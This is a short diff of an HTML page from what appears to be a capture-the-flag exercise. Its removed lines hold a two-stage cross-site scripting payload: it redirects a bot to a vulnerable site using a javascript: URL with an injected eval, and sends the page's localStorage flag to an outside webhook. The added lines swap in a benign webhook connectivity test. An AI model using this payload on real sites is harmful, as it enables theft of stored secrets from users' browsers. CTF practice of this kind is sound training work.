@@ -1,12 +1,16 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <title>Webhook Test</title>
+</head>
 <body>
-  <script>
-    // 第二階段的 payload，用於竊取 flag 並發送到你的 webhook
-    window.n = "fetch('https://webhook.site/ac56af50-62cb-4a25-be28-acb0111c98c1/?flag=' + localStorage.getItem('flag'))";
+  <h1>Testing Webhook Connection...</h1>
+  <p>Check your webhook site. You should see a message from me!</p>
 
-    // 將 bot 重定向到有漏洞的網站，並附上第一階段的短 payload
-    window.location = "https://safe-url.ctfi.ng/?redirect=javascript://cor.team/%0aeval(n)";
+  <script>
+    // 直接向你的 webhook URL 發送一個 fetch 請求
+    // 我們附加一個查詢字串 ?status=test_successful 來明確表示這是來自測試頁面的訪問
+    fetch('https://webhook.site/eb84ac19-a281-4430-a79c-d9637e3b02dc/?status=test_successful_from_wow_html');
   </script>
 </body>
 </html>
